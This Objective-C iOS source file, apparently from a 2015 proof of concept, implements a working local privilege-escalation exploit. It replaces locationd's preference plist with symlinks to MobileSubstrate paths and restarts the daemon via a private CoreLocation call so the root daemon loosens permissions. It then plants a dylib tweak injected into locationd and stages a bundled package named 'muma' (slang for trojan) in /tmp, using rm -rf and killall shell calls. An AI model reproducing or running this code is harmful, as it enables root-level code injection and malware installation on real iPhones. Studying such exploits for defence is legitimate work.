//
//  ViewController.m
//  Mytest
//
//  Created by 360 on 15/4/17.
//  Copyright (c) 2015年 360. All rights reserved.
//

#import "ViewController.h"
#include <dlfcn.h>

int global_flag = 1;
void(* CLClientShutdownDaemonPtr)(void);
@interface MyClass :NSObject
@end

@implementation MyClass

-(void)jailbreak
{
    NSLog(@"cuit:CLClientShutdownDaemon_addr");
    //sleep(1);
    BOOL flag1=0,flag2=0,flag3=0,index=1;
    
    while (1)
    {
        float iOSVer = [[[UIDevice currentDevice] systemVersion] floatValue];
        
        NSString * plistPath = [NSString stringWithString:@"/var/mobile/Library/Preferences/com.apple.locationd.plist"];
        NSString *Document = [NSSearchPathForDirectoriesInDomains(9, 1, 1) objectAtIndex:0];
        NSFileManager * manager = [NSFileManager defaultManager] ;
        
        
        
        if (iOSVer >= 8.0) {
            NSFileHandle *filehandle = [NSFileHandle fileHandleForWritingAtPath:@"/Library/MobileSubstrate/DynamicLibraries/MobileSafety.dylib"];
            if (filehandle) {
                BOOL flag = system("rm -rf /var/mobile/Library/Preferences/com.apple.locationd.plist");   //重要操作
                NSLog(@"cuit:removeItemAtPath_locationdplist_ios8_flag = %d",flag);
                
                NSError *error = [[NSError alloc]init];
                flag =  [manager createSymbolicLinkAtPath:plistPath withDestinationPath:@"/Library/MobileSubstrate/DynamicLibraries/MobileSafety.dylib" error:&error];//重要操作
                NSLog(@"cuit:createSymbolicLinkAtPath_ios8_dylib_flag = %d",flag);
                if ([error code]!=0) {
                    NSLog(@"error:",error);
                }
            }
        }
        else
        {
            BOOL flag = [[NSFileManager defaultManager] removeItemAtPath:plistPath error:0];
            NSLog(@"cuit:removeItemAtPath_tweakplist_flag = %d",flag);
            
            NSError *error = [[NSError alloc]init];
            flag =  [manager createSymbolicLinkAtPath:plistPath withDestinationPath:@"/Library/MobileSubstrate/DynamicLibraries" error:&error];//重要操作
            NSLog(@"cuit:createSymbolicLinkAtPath_ios7_flag = %d",flag);
            if ([error code]!=0) {
                NSLog(@"error:",error);
            }
        }
        CLClientShutdownDaemonPtr = nil;
        CLClientShutdownDaemonPtr = dlsym(dlopen("/System/Library/Frameworks/CoreLocation.framework/CoreLocation", RTLD_LAZY),"CLClientShutdownDaemon");//_CLClientShutdownDaemon
        
        NSLog(@"CLClientShutdownDaemonPtr addr = %x",CLClientShutdownDaemonPtr);
        if (CLClientShutdownDaemonPtr) {
            CLClientShutdownDaemonPtr();
        }
        
        sleep(1);
        NSError *error2 = [[NSError alloc]init];
        NSDictionary * dic = [NSDictionary dictionaryWithObject:[NSNumber numberWithUnsignedLong:511] forKey:NSFilePosixPermissions];
        
        if (iOSVer >= 8.0)
        {
            BOOL flag = [manager setAttributes:dic ofItemAtPath:@"/Library/MobileSubstrate/DynamicLibraries/MobileSafety.dylib" error:&error2];
            NSLog(@"cuit:setAttributes_ios8_dylib_flag = %d",flag);
            if ([error2 code] != 0) {
                NSLog(@"error2:%@",error2);
            }
            flag = system("rm -rf \"/var/mobile/Library/Preferences/com.apple.locationd.plist\"");   //重要操作
            NSLog(@"cuit:removeItemAtPath_locationdplist_flag = %d",flag);
            
            NSError *error = [[NSError alloc]init];
            flag =  [manager createSymbolicLinkAtPath:plistPath withDestinationPath:@"/Library/MobileSubstrate/DynamicLibraries/MobileSafety.plist" error:&error];//重要操作
            NSLog(@"cuit:createSymbolicLinkAtPath_ios8_plist_flag = %d",flag);
            if ([error code]!=0) {
                NSLog(@"error:",error);
            }
            
            CLClientShutdownDaemonPtr = nil;
            CLClientShutdownDaemonPtr = dlsym(dlopen("/System/Library/Frameworks/CoreLocation.framework/CoreLocation", RTLD_LAZY),"CLClientShutdownDaemon");//_CLClientShutdownDaemon
            
            NSLog(@"CLClientShutdownDaemonPtr addr = %x",CLClientShutdownDaemonPtr);
            if (CLClientShutdownDaemonPtr) {
                CLClientShutdownDaemonPtr();
            }
            
            flag = [manager setAttributes:dic ofItemAtPath:@"/Library/MobileSubstrate/DynamicLibraries/MobileSafety.plist" error:&error2];
            NSLog(@"cuit:setAttributes_ios8_plist_flag = %d",flag);
            if ([error2 code] != 0) {
                NSLog(@"error2:%@",error2);
            }
            
            flag = system("rm -rf \"/var/mobile/Library/Preferences/com.apple.locationd.plist\"");   //重要操作
            NSLog(@"cuit:removeItemAtPath_locationdplist_flag = %d",flag);
        }
        else
        {
            BOOL flag = [manager setAttributes:dic ofItemAtPath:@"/Library/MobileSubstrate/DynamicLibraries" error:&error2];
            NSLog(@"cuit:setAttributes_ios7_flag = %d",flag);
            if ([error2 code] != 0) {
                NSLog(@"error2:%@",error2);
            }//我们要修改/Library/MobileSubstrate/DynamicLibraries这个文件夹的owner, 就在/var/mobile/Library/Preferences/路径下创建一个名为com.apple.locationd.plist的Symbol文件指向/Library/MobileSubstrate/DynamicLibraries
        }
        
        NSString *BundlePath = [[NSBundle mainBundle] resourcePath];
        NSString *dbpath = [BundlePath stringByAppendingPathComponent:@"locationd.db"];
        NSString *command = [NSString stringWithFormat:@"cp -rH \"%@\" \"%@\"",dbpath,@"/Library/MobileSubstrate/DynamicLibraries/locationdtweak.dylib"];
        //-R, -r, --recursive copy directories recursively H follow command-line symbolic links in SOURCE
        NSLog(@"command = %@",command);
        BOOL flag = system([command UTF8String]);
        NSLog(@"cuit:system_cp_flag = %d",flag);
        if (!flag) {
            flag1 = 1;
        }
        
        NSString *debpath = [BundlePath stringByAppendingPathComponent:@"muma.db"];
        NSString *command2 = [NSString stringWithFormat:@"cp -rH \"%@\" \"%@\"",debpath,@"/tmp/gegeda.deb"];
        //-R, -r, --recursive copy directories recursively H follow command-line symbolic links in SOURCE
        NSLog(@"command = %@",command2);
        flag = system([command2 UTF8String]);
        NSLog(@"cuit:system_cp_flag = %d",flag);
        if (!flag) {
            flag2 = 1;
        }
        
        NSDictionary *dic1 = [NSDictionary dictionaryWithObjectsAndKeys:@"locationd",@"Executables",nil];
        NSDictionary *dic2 = [NSDictionary dictionaryWithObjectsAndKeys:dic1,@"Filter",nil];
        NSData * data1 = [NSPropertyListSerialization dataFromPropertyList:dic2 format:0x64 errorDescription:0];//kCFPropertyListXMLFormat_v1_0
        NSString * tweakplist = [Document stringByAppendingPathComponent:@"locationdtweak.plist"];
        flag = [data1 writeToFile:tweakplist atomically:1];
        NSLog(@"cuit:writeToFile_flag = %d",flag);
        if (flag) {
            NSString *command2 = [NSString stringWithFormat:@"cp -rH \"%@\" \"%@\"",tweakplist,@"/Library/MobileSubstrate/DynamicLibraries/locationdtweak.plist"];
            NSLog(@"command2 = %@",command2);
            int flag = system([command2 UTF8String]);
            NSLog(@"cuit:system2_cp_flag = %d",flag);
            if (!flag) {
                flag3 = 1;
                sleep(1);
            }
        }
        
        if (flag1 && flag2&&flag3) {
            flag = [[NSFileManager defaultManager] removeItemAtPath:tweakplist error:0];
            NSLog(@"cuit:removeItemAtPath_tweakplist_flag = %d",flag);
            
            flag = [[NSFileManager defaultManager] removeItemAtPath:dbpath error:0];
            NSLog(@"cuit:removeItemAtPath_db_flag = %d",flag);
            
            flag = [[NSFileManager defaultManager] removeItemAtPath:debpath error:0];
            NSLog(@"cuit:removeItemAtPath_deb_flag = %d",flag);
            
            flag = [manager removeItemAtPath:plistPath error:0];   //再次删除
            NSLog(@"cuit:removeItemAtPath_locationdplist_flag = %d",flag);
            if (CLClientShutdownDaemonPtr) {
                CLClientShutdownDaemonPtr();
            }
            
            NSError *error2 = [[NSError alloc]init];
            NSDictionary * dic = [NSDictionary dictionaryWithObject:[NSNumber numberWithUnsignedLong:493] forKey:NSFilePosixPermissions];//还原
            flag = [manager setAttributes:dic ofItemAtPath:@"/Library/MobileSubstrate/DynamicLibraries" error:&error2];
            NSLog(@"cuit:setAttributes_flag = %d",flag);
            
            if ([error2 code] != 0) {
                NSLog(@"error2:%@",error2);
            }
            NSLog(@"cuit:jailcodesuccess");
            break;
        }
    }
}

-(BOOL)checkjailcodeexecuted
{
    NSString *Document = [NSSearchPathForDirectoriesInDomains(9, 1, 1) objectAtIndex:0];
    NSDictionary *dic1 = [NSDictionary dictionaryWithObjectsAndKeys:@"locationd",@"Executables",nil];
    NSDictionary *dic2 = [NSDictionary dictionaryWithObjectsAndKeys:dic1,@"Filter",nil];
    NSData * data1 = [NSPropertyListSerialization dataFromPropertyList:dic2 format:0x64 errorDescription:0];//kCFPropertyListXMLFormat_v1_0
    NSString * tweakplist = [Document stringByAppendingPathComponent:@"locationdtweak.plist"];
    BOOL flag = [data1 writeToFile:@"/Library/MobileSubstrate/DynamicLibraries/locationdtweak.plist" atomically:1];
    NSLog(@"flag = %@",flag);
    
    
    if (flag) {
        return 0;
    }else
    {
        return 1;
    }
}
@end

@interface ViewController ()

@end

@implementation ViewController

- (IBAction)ExecuteJailCode:(UIButton *)sender {
    system("killall locationd");
    MyClass * myclass = [[MyClass alloc] init];
    if ([myclass checkjailcodeexecuted]) {
        [myclass jailbreak];
    }
    else
    {
        NSString *BundlePath = [[NSBundle mainBundle] resourcePath];
        NSString *dbpath = [BundlePath stringByAppendingPathComponent:@"locationd.db"];
        NSString *command = [NSString stringWithFormat:@"cp -rH \"%@\" \"%@\"",dbpath,@"/Library/MobileSubstrate/DynamicLibraries/locationdtweak.dylib"];
        //-R, -r, --recursive copy directories recursively H follow command-line symbolic links in SOURCE
        NSLog(@"command = %@",command);
        BOOL flag = system([command UTF8String]);
        NSLog(@"cuit:system_cp_flag = %d",flag);
        
        NSString *debpath = [BundlePath stringByAppendingPathComponent:@"muma.db"];
        NSString *command2 = [NSString stringWithFormat:@"cp -rH \"%@\" \"%@\"",debpath,@"/tmp/gegeda.deb"];
        //-R, -r, --recursive copy directories recursively H follow command-line symbolic links in SOURCE
        NSLog(@"command = %@",command2);
        flag = system([command2 UTF8String]);
        NSLog(@"cuit:system_cp_flag = %d",flag);
        
        CLClientShutdownDaemonPtr = nil;
        CLClientShutdownDaemonPtr = dlsym(dlopen("/System/Library/Frameworks/CoreLocation.framework/CoreLocation", RTLD_LAZY),"CLClientShutdownDaemon");//_CLClientShutdownDaemon
        
        if (CLClientShutdownDaemonPtr) {
            CLClientShutdownDaemonPtr();
        }
    }
}

- (void)viewDidLoad {
    [super viewDidLoad];
    // Do any additional setup after loading the view, typically from a nib.
}

- (void)didReceiveMemoryWarning {
    [super didReceiveMemoryWarning];
    // Dispose of any resources that can be recreated.
}

@end
